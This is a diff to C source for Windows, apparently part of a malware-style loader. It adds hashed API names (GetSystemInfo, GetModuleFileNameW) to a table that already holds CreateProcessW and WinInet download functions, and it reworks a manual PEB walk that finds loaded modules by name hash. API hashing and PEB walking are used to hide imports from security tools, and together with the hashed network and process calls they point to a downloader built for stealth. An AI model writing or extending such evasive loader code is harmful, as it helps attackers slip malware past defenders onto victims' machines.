@@ -54,6 +54,8 @@ static __forceinline uint32_t HashStringDjb2W(const wchar_t *str) {
 #define HASH_CreateProcessW             0x064DA4A4
 #define HASH_CreateWaitableTimerW       0x0604C949
 #define HASH_SetWaitableTimer           0xF503B838
+#define HASH_GetSystemInfo              0x4A1B09F8
+#define HASH_GetModuleFileNameW         0x390FE8E7
 
 #define HASH_InternetOpenW              0xF2123177
 #define HASH_InternetConnectW           0x60E96A2F
@@ -62,12 +64,29 @@ static __forceinline uint32_t HashStringDjb2W(const wchar_t *str) {
 #define HASH_InternetReadFile           0x17E5976A
 #define HASH_InternetCloseHandle        0x23E40FB0
 
+typedef struct _UNICODE_STRING_PTR {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING_PTR;
+
+typedef struct _LDR_DATA_TABLE_ENTRY_PTR {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID      DllBase;
+    PVOID      EntryPoint;
+    ULONG      SizeOfImage;
+    UNICODE_STRING_PTR FullDllName;
+    UNICODE_STRING_PTR BaseDllName;
+} LDR_DATA_TABLE_ENTRY_PTR;
+
 static __forceinline PVOID GetModuleBaseByHash(uint32_t hash) {
     PPEB peb = (PPEB)__readgsqword(0x60);
-    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
+    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
     PLIST_ENTRY current = head->Flink;
     while (current != head) {
-        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        LDR_DATA_TABLE_ENTRY_PTR *entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
         if (HashStringDjb2W(entry->BaseDllName.Buffer) == hash) return entry->DllBase;
         current = current->Flink;
     }
